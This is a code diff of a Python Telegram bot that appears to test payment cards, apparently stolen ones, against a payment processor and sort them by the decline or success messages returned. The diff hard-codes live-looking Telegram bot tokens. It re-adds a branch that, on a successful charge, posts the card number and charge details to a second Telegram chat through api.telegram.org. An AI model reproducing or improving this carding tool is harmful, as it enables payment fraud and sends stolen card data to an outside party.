@@ -1,5 +1,6 @@
 import requests
 import telebot
+import random
 import user_agent
 import time
 from telebot import types
@@ -7,7 +8,7 @@ import os
 from vip import Tele
 
 
-token = '7337084709:AAGSv7GAT-G_lnerCJYEDZXaWVHXUTD_41E'
+token = '7226967818:AAFr68Yv28RomFSdiWWRaQMsxLvhg8aZL24'
 
 #astlam
 tok = '7073895874:AAGU3cxwZjj0KbZlr7Vw6wnPuAnAMxaDCQ8'
@@ -261,7 +262,7 @@ def strip(message):
 »» @EbrahimEldsoky""")				
 					
 					
-					if "Your card was declined"  in last or 'Invalid account' in last or  'Your card number is incorrect' in last or 'Your card number is incorrect' in last or "Your card's expiration month is invalid" in last or "Your card's expiration month is invalid" in last or "Your card's expiration year is invalid" in last or "The Year field is required." in last or "Your payment was declined. Please try again." in last or 'Authentication Required:' in last:
+					if "Your card was declined"  in last or 'Invalid account' in last or  'Your card number is incorrect' in last or "Your card details could not be verified. Please double check them and try again." in last or "Your card's expiration month is invalid" in last or "Your card's expiration month is invalid" in last or "Your card's expiration year is invalid" in last or "The Year field is required." in last or "Your payment was declined. Please try again." in last or 'Authentication Required:' in last:
 						if dd == 0:
 							dd+=2
 						else:
@@ -393,14 +394,13 @@ def strip(message):
 						ccnn+=1
 						bot.reply_to(message,ccn)
 				
-				
-					elif "succes" in last:
-						requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text={cc}\n{iid}\n{charge}')
-
 	
 					elif 'incomplete' in last:			
 						live+=1
 						bot.reply_to(message,ap)
+						
+					elif '"success":true"' in last:
+						requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text={cc}\n{iid}\n{charge}{last}')
 					
 				
 						
